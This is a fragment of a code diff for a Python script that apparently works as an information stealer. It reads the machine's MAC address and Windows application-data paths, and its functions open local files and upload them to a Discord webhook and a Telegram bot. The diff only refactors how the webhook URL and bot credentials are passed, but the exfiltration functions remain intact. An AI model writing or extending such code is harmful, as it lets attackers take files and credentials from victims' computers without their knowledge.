@@ -4,13 +4,6 @@ from getmac import get_mac_address
 from pathlib import Path
 from dotenv import load_dotenv
 
-# Load environment variables
-dotenv_path = Path('env/.env')
-load_dotenv(dotenv_path=dotenv_path)
-DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-
 # Define environment keys
 windows_enviroment = {
     'app_local': 'LOCALAPPDATA',
@@ -41,7 +34,7 @@ def get_computer_information():
 
     return userprofile_path
 
-def send_info_to_discord(file_path, file_description):
+def send_info_to_discord(file_path, DISCORD_WEBHOOK_URL, file_description):
     try:
         with open(file_path, 'rb') as file:
             files = {'file': (os.path.basename(file_path), file)}
@@ -54,7 +47,7 @@ def send_info_to_discord(file_path, file_description):
     except Exception as e:
         print(f"Error sending file to Discord: {e}")
 
-def send_info_to_telegram(file_path, file_description):
+def send_info_to_telegram(file_path, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, file_description):
     try:
         with open(file_path, 'rb') as file:
             response = requests.post(
